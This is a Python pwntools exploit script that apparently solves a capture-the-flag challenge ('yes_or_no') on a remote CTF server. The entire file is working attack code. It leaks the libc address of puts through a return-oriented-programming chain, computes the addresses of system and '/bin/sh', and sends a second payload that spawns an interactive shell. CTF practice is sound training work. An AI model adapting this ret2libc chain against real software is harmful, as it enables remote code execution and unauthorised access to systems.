#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r=remote("ctf.j0n9hyun.xyz",3009)
#r=process("./yes_or_no")
context.arch = "amd64" 
print r.recvuntil("!")
r.sendline("9830400")
print r.recvrepeat(0.9)

pop_rdi = 0x400883
puts_plt=0x400580
puts_got=0x601018
main = 0x00000000004006c7


payload = "a"*26
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendline(payload)

puts = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))

log.info("buffer: %#x",puts)

offset = 0x6f690
libc = puts-offset
print "libc:",hex(libc)

systemoffset = 0x45390
system = libc + systemoffset

print "system:",hex(system)

print r.recvuntil("!")

r.sendline("9830400")

r.recvrepeat(0.9)

binbin = 0x18cd57
binshaddr = binbin + libc
payload = "a"*26
payload += p64(pop_rdi)
payload += p64(binshaddr)
payload += p64(system)

r.sendline(payload)


r.recvrepeat(0.9)

r.interactive()
